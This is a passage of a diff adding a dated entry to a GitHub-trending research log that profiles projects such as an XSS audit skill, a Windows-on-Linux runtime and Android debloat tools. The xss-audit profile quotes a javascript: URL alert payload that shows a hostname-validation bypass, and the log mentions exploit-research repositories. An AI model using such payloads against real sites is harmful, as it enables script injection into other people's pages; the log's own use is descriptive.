line by line; ex-ussr-kinship-research's eleven references files were only sampled four of which seed-sources.md at 48497 bytes and field-lessons.md at 29696 bytes are unread; ub-mode's four companion tool implementations are unread AND whether SKILL.md actually CALLS the three tools rather than merely naming them is the single most important open question; KohakUnlock's five tools/ scripts and docs/TURING.md, docs/AMPERE.md, docs/AGENT-GUIDE.md and docs/RESULTS.md are unread AND every hardware claim is author-reported and was NOT verified on hardware; raven's native/ subdirectory responsibilities, the complete components list of LICENSES.json, docs/packaging.md, the new CLI parameters and whether the benchmarks were re-run after the rewrite are all unverified AND the README benchmark table carries no date stamp.
+
+## 2026-10-25
+
+### YoyoLin008/mcreplay (122 stars, fork 6) - songjianyang/xss-audit (194 stars, fork 50) - mirkobrombin/raven (166 stars, fork 4) - xMazaki/unbloat-android-tv (174 stars, fork 14) - rddmwmddr/android-ad-cleaner (140 stars, fork 12) - Snapintosh/Snapintosh (875 stars, fork 50) = today's signal is not a shared domain but three findings that only appear when you check metadata properly: (1) a repository whose created_at is a RENAME timestamp rather than a project start - mirkobrombin/raven shows created_at 2026-10-24T17:13:42Z while the commits API Link header reports 653 commits with the oldest at 2025-09-05T18:51:56Z (parents=0, unique root), and a commit at 2026-10-24T17:14:02Z is literally titled "docs: clone Raven from its renamed repository" - any created_at-sorted "new projects today" list ranks a 14-month-old project first; (2) an organisation name that was wrong for four days and propagated into three dailies plus one project profile - the org is Snapintosh (Organization, created 2026-10-23T05:28:04Z, 8 public repos) while Macintosh is a separate User account (created 2013-05-05, public_repos 0) and Macintosh/Snapintosh returns 404 - the repository ID 1429116361 is stable across Acelogic/Snapintosh and Snapintosh/Snapintosh, so this is a transfer, not a delete, and not a rebuild; (3) the McDonald's MCP developer challenge, where an official third-party API produced 122 repositories with mcd in the name created on 2026-10-24 alone, 94 descriptions mentioning 麦当劳, an official RANKING.md with 102 entries, and 100+ registration issues - but the ranking sorts by stars, and stars in a contest are a participation metric rather than an adoption signal, so the 122-repository burst is an EVENT measurement, not a value measurement
+
+YoyoLin008/mcreplay 1.3 days 122star fork 6 fork/star 4.9% (Python with GitHub license.spdx_id = NOASSERTION although the LICENSE file's first line is MIT License and its tail adds two own clauses including "This license grants no permission to use the official service commercially or outside its rules" - 1467 KB - YoyoLin008 individual - subs 0 oi 0 - topics is an empty array - the contributors API returns 1 person - the releases API returns 0 entries - 8 commits - IT TURNS A SINGLE MCP CALL INTO A REPRODUCIBLE LOCAL STRUCTURAL TEST - four separable parts: an observation layer that drops the real business values in memory and writes a placeholder-only structural package (recorded file permissions measured 0600), a comparison layer producing breaking/review/info plus exit codes 0/1/2/3 where exit code 2 MEANS a breaking change and can therefore be asserted by CI, a replay layer that stands up a stdio server via the OFFICIAL Python MCP SDK serving three read-only tools, and a CI layer - the official M-China/mcd-mcp-server repository contains ONLY README.md (18722 bytes) and README_EN.md (19845 bytes), confirmed by a recursive tree query, so the official side offers documentation but NOT A CONTRACT and there is no machine-readable schema - AND THE MOST VALUABLE ASSET IS docs/competitive-research.md WHICH INSPECTS 10 COMPETITORS ONE BY ONE attaching each competitor's official registration issue number and the exact SHA of the inspected file, concluding "The inspected sample is unusually implementation-rich. It would be inaccurate to label every competitor a 'thin AI wrapper.' ... several contain deterministic engines and defensive transport" - THIS IS THE FIRST COUNTER-EXAMPLE TO "HEAT EQUALS VALUE" IN THIS BATCH AND IT WAS WRITTEN BY A CONTEST ENTRANT COMPETING AGAINST THEM - AND ITS TWO DOCUMENT PATHS ARE KEPT IN PARALLEL RATHER THAN MERGED: docs/capability-matrix.md opens with "No authenticated calls were possible ... official authenticated calls remain unverified. All reliability judgments below are provisional, not production certifications." while docs/LIVE_VERIFICATION.md records the measured run - the evidence grading goes down to the field with S: meaning field names come from a third-party tools/list capture by CRFXN5C/mcd-mcp-kit on 2026-10-23 (and it explicitly writes "Do not copy this project's implementation or make our own live-test claims from it") and O: meaning official issue examples, and it notes that the official documentation's data description is "a semantic summary from official documentation, not an output JSON schema" - the official issues are treated as observed pain points rather than guarantees, including issue 4 on rate limiting, issue 9 on the optional meal pool, issue 11 on missing nutrition IDs, issue 13 on the order list being limited to the most recent 10 entries where it writes "Never label this full history/month/year analysis", and issue 16 on 35 versus 33 tools with "wrong code-to-productCode mapping silently yields price0. Missing/zero price must not be treated as free" - the QA record is unusually complete for an offline-first project: pytest -q 120 passed in 4.35s across core/comparison/CLI/MCP-service suites with 25-second deadlines on protocol tests, ruff check and ruff format --check passing, sdist and wheel building, pip check after installing the wheel in a clean environment, Gitleaks 8.30.1 over the bundled official-20261024.json fixture, and pip-audit over all 29 locked dependencies - the demo path ships a destructive sample on purpose and mcreplay compare on that demo is EXPECTED TO EXIT 2)
+
+songjianyang/xss-audit 4.6 hours 194star fork 50 fork/star 25.8% (HIGHEST IN THIS BATCH - but read it as fork unit cost, not quality) (MIT - the whole repository is 15 KB - topics is an empty array - the contributors API returns 1 person - the releases API returns 0 entries - THE WHOLE REPO HAS ONLY 1 COMMIT - four files only: SKILL.md (26430 bytes), README.md (5894 bytes), SECURITY.md (1176 bytes), examples/sample-report.md (3454 bytes) - THERE IS NOT ONE EXECUTABLE FILE - ITS PRODUCT IS PROSE - 14 LAYERS OF CHECKS THAT ARE REAL SINK CLASSES rather than a simplified grep list: DOM/HTML injection, attribute and event handlers, URL and navigation including the "new URL('javascript://trusted.com/%0aalert(1)').hostname is trusted.com" trap where hostname-only validation is insufficient, config and JSON-in-script with </script> breakout, props spreading and gadget components, untrusted sources and message passing, prototype pollution chains, JS execution, CSS injection, SVG/MathML/XML namespace confusion, Markdown/sanitizer/mXSS with double parsing, framework rendering and trust hooks, Trusted Types and CSP, and framework binding/template injection - AND THREE PLACES WHERE IT WRITES ITS OWN LIMITS DOWN - the Reality check paragraph opens the file with "No static checklist can guarantee complete coverage against all XSS variants ... none of these measures guarantees complete protection on its own" - the execution rules enumerate failure modes as prohibitions: "DO NOT SKIP ANY SEARCH CATEGORY", "Do not assume a file is safe based on filename alone. Define the audit scope and exclusions ... and record exclusions and unread files in the report", "TRACE DATA FLOW FOR EACH SUSPICIOUS MATCH", and "you MUST verify if the input is validated/sanitized for the CORRECT context (HTML/attribute/URL/JS/CSS)" - AND THE SAMPLE REPORT'S FIRST LINE IS "Fictional example: This report demonstrates formatting and classification only. It is not the result of a real audit, and no reproduction steps were executed" - in a category where the sample report IS the selling point, the only example negates itself - ITS SECURITY.md EVEN GOVERNS WHERE ITS OUTPUT GOES: "Vulnerabilities discovered in another project by using this skill should be reported to that project's maintainers through its own security process, not to this repository" - README warns that generated reports may contain sensitive paths, source code, internal domains, or credentials and must be sanitized before sharing - the author's own account was created 2015-05-27 with only 5 public repos and 35 followers, of which CVE-2026-47644, CVE-2021-26882 and HEVD_EXPLOIT are vulnerability research, which supports the inference that he is a security researcher publishing his own workflow rather than selling a product - HIS CLAIMED MSRC LEADERBOARD TOP-10 PLACEMENTS FOR FOUR CONSECUTIVE QUARTERS ARE NOT INDEPENDENTLY VERIFIED BY THIS DAILY)
+
+mirkobrombin/raven 166star fork 4 fork/star 2.4% (LOWEST IN THIS BATCH - and for a very concrete reason) (Go with GitHub license.spdx_id = MIT and a root MIT LICENSE - 17879 KB - mirkobrombin individual whose account was created 2014-10-31 with 159 public repos and 483 followers - subs 1 oi 8 - topics is an empty array - the contributors API returns 1 person - the releases API returns 0 entries so distribution requires building from source - THE CREATED_AT FIELD IS A RENAME TIMESTAMP: created_at is 2026-10-24T17:13:42Z while the commits API Link header reports 653 commits total, page 7 of 100-per-page returns 53 entries and page 8 returns 0, and the oldest three commits are 2025-09-05T18:51:56Z "feat: add the RISC-V runtime" with parents=0 meaning a unique root, then 2025-09-05T18:54:45Z "feat: rename techvm to govm and add README", then 2025-09-05T19:24:19Z - a sibling repository mirkobrombin/raven-website was created the same day pointing at useraven.org - THIS IS THE CREATED_AT TRAP IN ITS CLEANEST FORM AND IT IS THE SAME TECHNICAL PROBLEM AS THE BATCH SPAM FILTERED EARLIER THIS WEEK (userforgitmaker/python and userforgitmaker1/python, same account and same repo name 72 minutes apart) FROM THE OPPOSITE DIRECTION - created_at is abused both by renamed projects and by bulk accounts - WHAT IT DOES: runs Windows applications on Linux with NO virtual machine, NO winetricks and NO DLL overrides, the program's code runs directly on the host CPU inside a sandbox where it cannot reach Linux, and every call to the system is answered by Raven playing the part of the Windows kernel and its services for processes and threads, files, the registry, windows and input - THE IMPLEMENTATION SHAPE IS cmd/govm/ with one large file per DLL (advapi32.go 242 KB, comctl32.go 97 KB, d2d1.go 83 KB) plus pkg/ split into 15+ API-domain packages plus native/upstream/ with 18 components of which 9 are ReactOS ones, and internal/compat/ contains ONLY log.go and matrix.go - ⭐⭐⭐ IT SCORES COMPATIBILITY IN FOUR 25% STAGES instead of a binary can-it-run verdict: install, start, main window, workflow, giving Notepad++ 8.7.1 100%, 7-Zip 24.09 (both EXE installer and MSI), Audacity 3.6.4, ClassiCube 1.3.8 and Minesweeper 75%, KeePass 2.57 50% and VLC 3.0.21 25% (installs but does not start) - ⭐⭐ AND ITS BENCHMARKS INCLUDE TWO VERIFIABLE METHODOLOGICAL MOVES: it INVALIDATES ITS OWN EARLIER CLASSICUBE SERIES AND SAYS WHY ("These replace the earlier ClassiCube series; its scene configuration was not verified against the retained samples.") while keeping the old data in docs/benchmarks.json for comparison, and it ALTERNATES RUNTIMES ACROSS FOUR ROUNDS ("Each workload runs three times and the charts show the median; ClassiCube runs four rounds alternating the runtimes, so a change in machine load weighs on both") - with fixed seed 1 the medians are Raven 71.5 FPS, Wine 11.0 63.0, Soda 11.0-32-experimental 63.0, and the competitor's uncompleted run is recorded rather than hidden ("The Soda Direct3D 11 triangle did not finish within its 600-second limit") - IT ALSO PUBLISHES ITS OWN TEST-SKIP CONDITIONS instead of counting skips as passes ("Some tests need software Raven cannot redistribute; point RAVEN_MINESWEEPER, RAVEN_NETFX_INSTALLER, RAVEN_NETFX35_PACKAGE, RAVEN_XNA_INSTALLER and RAVEN_REDIST_DIRECTORY at your own copies, or those tests are skipped") - IT TRADES PERFORMANCE FOR REPRODUCIBILITY BY CHOOSING SOFTWARE VULKAN (Mesa 26.0.8 lavapipe) and says so plainly ("Software Vulkan keeps the numbers reproducible anywhere; a hardware GPU raises them for every runtime") - each application gets its own RAVEN_PREFIX with its own C: drive and registry, the prefix is snapshotted before every installer run and --restore-prefix can roll back - ⭐ AND ITS LICENCE STORY IS THE FIFTH KIND OF LICENCE METADATA PROBLEM IN THIS DAILY'S SERIES: the root LICENSE is MIT and spdx_id says MIT, but native/upstream/ statically pulls in ReactOS components under GPL and LGPL plus libpng, Unicode and Skia, and the obligation appears only as prose in the README ("a build that includes them follows those terms too") with NO structured upstream licence manifest in the repository, so a scanner will return the wrong default answer of "pure MIT" - the README also states plainly that only Windows applications are supported, and that native/upstream/reactos-user32/ contains just bridge.c, register.c, scrollbar_control.c and shim, so the ReactOS import is selective rather than wholesale)
+
+xMazaki/unbloat-android-tv 4.5 hours 174star fork 14 fork/star 8.0% (Java with GitHub license.spdx_id = NOASSERTION although the LICENSE file's first line is MIT License and its TAIL ACTIVELY EXCLUDES THE BUNDLED PHOTOS ("Note: bundled photos (ecran-accueil, assets/walls) are NOT under MIT; each keeps its own Creative Commons license, see CREDITS.md. Poppins font: SIL OFL 1.1.") - 10660 KB - xMazaki individual - subs 1 oi 0 - topics is an empty array - the contributors API returns 2 people - the releases API returns 0 entries - 14 commits - A FRENCH PERSONAL PROJECT WITH A WARNING AT THE TOP OF THE README ("Projet personnel partagé tel quel, sans aucune garantie.") - ⭐⭐⭐ ITS MENU IS A TABLE WHERE EVERY ROW CARRIES A "DOES IT CHANGE THE TV" COLUMN and the reversibility claim is a MECHANISM rather than a promise: 1 diagnose and backup (No), 2 slim (Yes, reversible), 3 install Zen Home and optionally disable the stock launcher (Yes, reversible), 4 my photos (Yes, reversible), 5 screenshot (No), 6 restore everything (Back to original), 7 change TV (No) - and it states "Nothing is ever uninstalled, except Zen Home if you ask. Apps are only disabled and can be turned back on in one click." - ⭐⭐⭐ THREE REAL ENGINEERING DESIGNS: (1) IDENTITY LOCK - the kit records the TV's serial number and checks before EVERY action that the device at that address is the same one, "Another TV, a box or a Fire Stick that gets that IP will never be modified" which is a concrete defence against adb's default-first-device behaviour; (2) PROTECTED APPS - Play Store, Google services, settings, keyboard and WebView are never disabled EVEN IF ADDED TO A LIST, which is a user-input-cannot-escalate-privilege rule; (3) A SINGLE DISABLE BOUNDARY - "Option 2 never turns off the current home screen. Only option 3 can disable it, once Zen Home is installed." - ⭐⭐ AND IT WRITES DOWN WHEN REVERSIBILITY FAILS, which is rare in this batch: the TV-side fallback path when the computer is gone (Settings to Apps to See all apps to Show system apps to Enable), and "TV system updates stay enabled. After a big update, some apps may be re-enabled: just run option 2 again. This happens often on Fire TV." - measured on ONE 2019 TCL (Android 9, 2 GB RAM) with idle CPU 61% to 12% and free memory 451 MB to 720 MB - ⭐⭐⭐ ITS ASSET LICENCE HANDLING IS THE MOST THOROUGH IN THIS BATCH: 19 photos from Wikimedia Commons Featured pictures cropped to 16:9 at 1920x1080 with CREDITS.md listing file name, place, author, licence (CC BY-SA 3.0 and 4.0) and source link for EVERY single one, Poppins under SIL OFL 1.1, and the LICENSE file itself declaring which assets are outside MIT - and the Windows and macOS/Linux scripts (scripts/kit.ps1 and scripts/kit.sh) do exactly the same thing while SHARING THE SAME Lists AND THE SAME sauvegardes FOLDER so a job can be started on one computer and restored from another - the ZenHome.apk is 9,725,914 bytes with an editable source directory containing AndroidManifest.xml, the three Poppins weights and the 19 wallpapers - its Windows side is an unsigned script)
+
+rddmwmddr/android-ad-cleaner 4.5 hours 140star fork 12 fork/star 8.6% (Python - MIT - 4043 KB - rddmwmddr individual - subs 1 oi 6 - topics 8 covering adb, ai-agent, android, coloros, debloat, hyperos, magicos and originos - the contributors API returns 1 person - 25 commits - THE releases API RETURNS 2 ENTRIES with v0.1.0 published 2026-10-24T07:27:54Z carrying 1 asset and v0.2.0 published 2026-10-24T07:52:08Z carrying 4 assets - it removes ads, hot-search entries, feed recommendations and marketing pushes from Chinese Android phones with NO root, NO unlock, NO flashing and system updates untouched - ⭐⭐⭐ ITS MOST VALUABLE ASSET IS A 10-RULE AGENTS.md ADDRESSED TO AI AGENTS THAT CAN EXECUTE COMMANDS ON THE USER'S COMPUTER (WorkBuddy, Claude Code, Codex, Trae, Cursor), where each rule maps to a specific agent failure mode: (1) every adb command carries -s <serial> because "the computer may have several devices connected (TV, emulator)"; (2) normal functions must not break, listing search, the minus-one screen card, app store install and update, browser, weather alerts, delivery and update notifications; (3) prefer in-app switches, only pm suspend for packages and only with the user's consent, and NOT pm uninstall and NOT pm disable-user; (4) never touch system updates, never root, never unlock BL, never flash modules, never modify the system partition; (5) explain before changing and be able to undo; (6) ⭐ DO NOT CONSENT FOR THE USER - on user agreements, privacy policies and permission prompts press Cancel, Later, Deny, Never and do NOT press Agree or Allow; (7) do not bypass the lock screen; (8) ⭐ do not screenshot account pages and delete any that were taken; (9) restore always-on display and remind the user to turn developer mode off by running run.py finish; (10) ⭐ do not suspend com.heytap.quicksearchbox, com.coloros.assistantscreen or the brand app stores - and rule 10 states that the TOOL REFUSES because suspending them would break functions - ⭐⭐ THAT IS THIS BATCH'S MOST VALUABLE SINGLE LINE, because it does not rely on a prompt to restrain the agent, it makes the tool refuse at the code level, which is the same principle as 10-24's xevrion/hatchzip ("Anything that can be refused is refused before the archive is touched") reappearing in the device-operation domain - ⭐ IT ALSO SHIPS FOUR BUILT DISTRIBUTABLES (Mac Apple Silicon dmg, Mac Intel dmg, Windows installer exe, Windows portable zip) with the macOS build SIGNED AND NOTARISED so it opens with a double click, while the Windows build still requires "More info to Run" meaning it is unsigned - its per-device recipes are recipes/honor-PNM-AN10/recipe.py 8659 bytes, recipes/oppo-PLP120/recipe.py 5705 and recipes/xiaomi-M154FF/recipe.py 4061, plus tool/run.py 18141, tool/fast.py 19649, tool/explore.py 4779, tool/chan_fast.py 4846, gui/app.py 17696, gui/shots.py 3550, gui/smoke_test.py 854, docs/00- through 08- in Chinese and CLAUDE.md and CODEBUDDY.md pointers, and it keeps a services-class default UNCHECKED so that only system ads, hot-search/feed, promotion slots and marketing pushes are handled)
+
+Snapintosh/Snapintosh 875star fork 50 (Python with GitHub license.spdx_id = NOASSERTION although the LICENSE file's first line is MIT License and its second line is "Copyright (c) 2026 The Snapintosh contributors" - 10361 KB - subs 10 oi 6 - the contributors API returns 1 person - the releases API returns 0 entries - ⭐⭐⭐ THE ORGANISATION NAME WAS WRONG FOR FOUR DAYS AND THIS DAILY CORRECTS IT - the org is Snapintosh (Organization, created 2026-10-23T05:28:04Z, 8 public repos, 11 followers) while Macintosh is a SEPARATE User account (created 2013-05-05, public_repos 0) and Macintosh/Snapintosh returns 404 - the repository ID 1429116361 is stable across Acelogic/Snapintosh and Snapintosh/Snapintosh so this is a TRANSFER rather than a delete or a rebuild, and the commit history is fully preserved - the 10-24 daily recorded the rename as Acelogic/Snapintosh to Macintosh/Snapintosh, which was wrong, and the wrong name had propagated into three dailies and projects/snapintosh.md's frontmatter title and url - ⭐ pushed_at is 2026-10-24T22:28:36Z, about 9 minutes before the snapshot, so the project is still committing at high frequency, which means it is a COUNTER-EXAMPLE to the heat-versus-development decoupling and its 875 stars are probably real attention migration - ⭐ the org's 8 repos all saw activity: Snapintosh/q1n1 (35star fork 2, MIT, created 2026-09-16, described as "m1n1 retargeted to a Snapdragon laptop: EL2 after ExitBootServices on the ASUS Zenbook A16, serving m1n1's proxy protocol over q1n1's own USB stack"), plus SnapAdreno, SnapI2CHID and SnapMetal pushed at 2026-10-24T22:28:2x-3x, while air2ir3 and SnapQCC2072 sit at 2026-10-23T08:23:1x - ⭐ THE ANSWER TO 10-24'S OBSERVATION POINT "TRACK WHICH OF THE 7 SUBREPOSITORIES GETS AN EXTERNAL STAR FIRST" IS: NONE DID IN ROUGHLY 48 HOURS, so the split has not yet produced a second growth curve - and this daily cannot verify whether those sub-repo stars are self-grants by the forking author)
+
+> 证据边界：项目名称、星标、topics、description、license、size、forks 来自 2026-10-25 GitHub REST/Search API（gh CLI 认证，UTC 2026-10-24T22:38Z 快照）+ 公开元数据（created_at / pushed_at / stargazers_count / forks_count / subscribers_count / open_issues_count / language / description / topics / license / size / owner.type / id）+ 各项目 README、SKILL.md、SECURITY.md、AGENTS.md、CLAUDE.md、CODEBUDDY.md、CREDITS.md、LICENSE、MCP_INTEGRATION.md、CONTEST_DECLARATION.md、docs/{capability-matrix,LIVE_VERIFICATION,limitations,QA,competitive-research,PRD,LAUNCH}.md、examples/sample-report.md、RANKING.md 原文摘录（gh api .../readme 与 .../contents/{...} 以 Accept:application/vnd.github.raw 抓取）+ 仓库树（gh api .../git/trees/HEAD 与 ?recursive=1）+ 历史与贡献者规模（gh api .../commits 含 Link 头分页、.../contributors、.../releases）+ 组织信息（gh api users/{org} 与 orgs/{org}）。X 小时 / Y 天 Z star is a rough lower bound based on created_at to 2026-10-25 total stars divided by elapsed time; NO per-day star delta was measured because that requires paginated stargazer traversal. Fields verified to be zero or empty are labelled: the contributors API returns 1 person for YoyoLin008/mcreplay, songjianyang/xss-audit, mirkobrombin/raven and rddmwmddr/android-ad-cleaner and 2 people for xMazaki/unbloat-android-tv; the releases API returns 0 entries for mcreplay, xss-audit, raven and unbloat-android-tv and 2 for android-ad-cleaner; topics is an empty array for all five new projects while android-ad-cleaner has 8; subscribers_count are 0 / 0 / 1 / 1 / 1 with mcreplay and xss-audit the lowest in this batch. THREE KINDS OF VERIFIABLE METADATA PROBLEMS WERE CONFIRMED TODAY: (1) A RENAMED REPOSITORY WHOSE created_at IS THE RENAME TIMESTAMP - mirkobrombin/raven reports created_at 2026-10-24T17:13:42Z while the commits API Link header reports 653 commits whose oldest is 2025-09-05T18:51:56Z with parents=0, and a commit at 2026-10-24T17:14:02Z is titled "docs: clone Raven from its renamed repository", so any created_at-sorted new-project list ranks a 14-month project first; (2) A CONTAMINATED ORGANISATION NAME THAT PERSISTED FOR FOUR DAYS AND APPEARED IN THREE DAILIES AND ONE PROJECT PROFILE - the org is Snapintosh and Macintosh is a different User account with public_repos 0, and Macintosh/Snapintosh returns 404 while the repository ID 1429116361 stays stable, proving a transfer rather than a deletion; (3) A FIFTH KIND OF LICENCE METADATA PROBLEM - raven's spdx_id is MIT and its root LICENSE is MIT but native/upstream/ statically embeds 18 upstream components including 9 GPL/LGPL ReactOS ones plus libpng, Unicode and Skia with the obligation present only as README prose and no structured licence manifest, so scanners get a wrong "pure MIT" default, whereas the NOASSERTION cases in mcreplay and unbloat-android-tv remain the "machine-readability defect" kind because their LICENSE files themselves are unambiguous. THE McDONALD'S MCP ECOSYSTEM IS THE DOMINANT EVENT OF THE DAY AND ITS NUMBERS ARE: mcd in:name created:2026-10-24 returns 122 repositories (mcd in:name in total is 20,628) and 94 descriptions mention 麦当劳 on the same date (these two sets overlap and are NOT independent counts); the official M-China/mcd-developer-innovation-challenge (237star fork 13, created 2026-09-23T06:02:33Z, pushed_at 2026-10-24T22:00:59Z) states "报名及排名 | 2026年10月9日10:30—10月25日23:59" so TODAY IS THE REGISTRATION DEADLINE, its RANKING.md header reads "更新时间：2026-10-25 06:00:57" with 102 ranked entries led by mccarbon (yeqv111/mccarbon, 1,566star) and its issues API shows 100+ registration issues with the newest being #1334 at 2026-10-24T21:55:32Z; the official M-China/mcd-mcp-server (246star fork 9) contains ONLY README.md and README_EN.md per a recursive tree query and its README states the endpoint https://mcp.mcd.cn, Streamable HTTP, "每个 Token 每分钟最多允许 600 次请求，超过限制会返回 429 错误码", token application at https://open.mcd.cn/mcp, China mainland only excluding Hong Kong, Macau and Taiwan, and "未经书面授权，不得将本仓库内容用于商业售卖、付费分发、引流变现或任何暗示官方背书、误导公众的用途" - THE RANKING SORTS BY STARS, AND STARS IN A CONTEST ARE A PARTICIPATION METRIC RATHER THAN AN ADOPTION SIGNAL. VERIFIABLE SPAM WAS FILTERED: userforgitmaker/python (34star) and userforgitmaker1/python (34star) share the same account prefix and the same repo name 72 minutes apart with no description; routerhubSI/uncensored-ai-api (124star) and routerhubSI/glm-5.3-abliterated (118star) were published the same day by the same account with 21 model names stuffed into topics; aideveloper-web/chatgpt-free (51star) has size of only 7 KB. CANDIDATES NOT INCLUDED IN key_projects: jouaaaaaa/mcd-self-butler (150star fork 3, MIT, official ranking entry 23, whose SKILL.md has six hard rules including trusting only calculate-price for prices and only list-nutrition-foods for nutrition and decomposing a set meal with query-meal-detail before analysing it and never ordering automatically and never fabricating, and whose MCP_INTEGRATION.md gives three reasons why local scripts do not call MCP directly - it is the same ecosystem's opposite orientation to mcreplay, one doing business decisions and one doing contract regression), big-tooth/mcd-recommend-meal-by-emotion (83star), xiaozhangup/Oh-My-McDonald (71star), xanthichi/mcd-meal-mate (70star), tian1326/mcd-coupon-assistant (64star), xkx121029/mcd-vibe-commit (131star, which shares a byte-identical CONTEST_DECLARATION.md with mcreplay and mcd-self-butler whose md5 is 91a7b32ec28098b609ca3f215cdf7147 and which matches the official repository's file exactly, proving the file is a copied template rather than an independent declaration), ACD421/PHP (25star fork 7, NOLICENSE, self-described php2shell follow-up research including a CVSS 9.8 var_destroy reentrancy UAF still unfixed, therefore security research without a licence declaration and not archived), lillyguisnet/sam3-segmentation (61star, MIT, 10 topics), thomasunise/argus (28star, MIT), lwh0630/TokenBar (21star, Dart), CRFXN5C/mcd-mcp-kit (19star, MIT, a NON-CONTEST third-party tool-capture set whose tools/list capture mcreplay uses as a secondary evidence source while explicitly refusing to copy its implementation) and zhaoolee-style spam. CONTINUED TRACKING: deepseek-ai/DeepInfer 21,823star fork 2,487 (subs 51) with pushed_at still 2026-10-21T04:55:44Z, now four consecutive days without a push while stars still rise (10-23 recorded 19,806star, 10-24 recorded 21,056star, today 21,823star); colinhacks/reylo 1,206star fork 8 (subs 2) with pushed_at 2026-10-24T04:54:52Z and size 82,262 KB against 78,474 KB on 10-24; UniXNU/UniXNU 896star fork 166 (subs 5) with pushed_at 2026-10-24T21:40:07Z which is ACTIVE; oosexgang/hackios-xnu-kernel 1,278star fork 226 (subs 6, against 1,064star fork 183 on 10-24) with pushed_at 2026-10-24T18:09:50Z; theorem-labs/oss-verify-proofs 131star fork 8 (subs 0, against 92star fork 6 on 10-24) with pushed_at 2026-10-23T03:58:49Z which is TWO DAYS without a push; xevrion/hatchzip 1,678star fork 40 (subs 5, against 888star fork 17 on 10-24) with pushed_at 2026-10-24T17:04:55Z; Snapintosh/Snapintosh 875star fork 50 (against 745star fork 43 on 10-24) with pushed_at 2026-10-24T22:28:36Z which is about 9 minutes before the snapshot and therefore still committing at high frequency - THE ANDROID TV DE-BLOATING LANE SAW ITS EIGHTH CONSECUTIVE DAY OF NEW PROJECTS (xMazaki/unbloat-android-tv 174star, rddmwmddr/android-ad-cleaner 140star, Gathin23/cleanyourtv 31,585star fork 3,671, simbasjungles/free-my-tv 4,263star fork 688, pengchujin/aerial-tv 4,352star fork 342, Ansub/tv-detox 1,479star fork 153, humblemuzzu/dumbtv 1,476star fork 133, nthnclrk/CleanFrame 570star fork 95) and the two new ones are archived separately for their own architectural value rather than counted again in the trend ranking.
+
 ## 2026-10-24
 
 ### oosexgang/hackios-xnu-kernel (1,064 stars, fork 183) - theorem-labs/oss-verify-proofs (92 stars, fork 6) - xevrion/hatchzip (888 stars, fork 17) - haplollc/Vesalius (61 stars, fork 1) = today's signal is not a shared domain but four unrelated projects answering the same question in four different media: "if my judgement is wrong, how would I know?" - a document that enumerates how your own checks lie, a proof checker that refuses out-of-bounds axioms, an absolute invariant for a destructive operation, and a benchmark that publishes its own failed round
